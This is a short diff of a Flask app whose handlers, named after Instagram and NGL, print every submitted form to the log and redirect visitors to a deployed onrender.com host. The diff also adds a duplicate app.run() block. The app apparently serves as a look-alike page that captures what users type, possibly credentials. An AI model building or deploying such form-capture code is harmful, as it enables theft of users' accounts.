@@ -24,14 +24,18 @@ def after():
 def run_insta_code():
     if request.method == "POST":
         print(request.form)
-        return redirect("http://0.0.0.0:5000/saanvi_17")
+        return redirect("https://ngl.onrender.com/saanvi_17")
 
 
 @app.route("/saanvi_17", methods=["POST", "GET"])
 def run_ngl_code():
     if request.method == "POST":
         print(request.form)
-        return redirect("http://0.0.0.0:5000/after")
+        return redirect("https://ngl.onrender.com/after")
+
+
+if __name__ == "__main__":
+    app.run()
 
 
 if __name__ == "__main__":
